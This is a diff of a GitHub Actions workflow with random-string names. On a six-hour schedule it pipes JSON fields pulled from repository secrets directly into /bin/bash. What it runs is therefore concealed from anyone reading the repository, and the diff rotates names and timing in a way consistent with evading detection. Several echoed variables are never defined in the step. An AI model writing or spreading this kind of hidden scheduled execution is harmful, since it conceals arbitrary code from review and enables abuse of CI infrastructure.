@@ -3,25 +3,17 @@ name: guoxunsu6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
-
-jobs:  # 20343
+    - cron: '15 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoxunsu6789
         env:
-          qpt06556: ${{ secrets.qpt06556 }}
+          ofgvl00445: ${{ secrets.ofgvl00445 }}
         run: |
-          echo $qpt06556 | jq -r .ioqo6889 | /bin/bash
-          echo $jr292 | jq -r .orlo6 | /bin/bash
-          echo $xrxfk67874 | jq -r .x58524 | /bin/bash
-          echo $ixuaz61 | jq -r .biucc30792 | /bin/bash
-          echo $qyhn61 | jq -r .gmkb786 | /bin/bash
-          echo $xgkah3779 | jq -r .mmxde261 | /bin/bash
-          echo $neh38 | jq -r .ljg68786 | /bin/bash
-          echo $r17 | jq -r .jph8951 | /bin/bash
-          echo $fzw974 | jq -r .tab1 | /bin/bash
+          echo $ofgvl00445 | jq -r .ay644 | /bin/bash
+          echo $a50 | jq -r .ipnkf4 | /bin/bash
+          echo $sjojc4 | jq -r .kmvk30 | /bin/bash
 
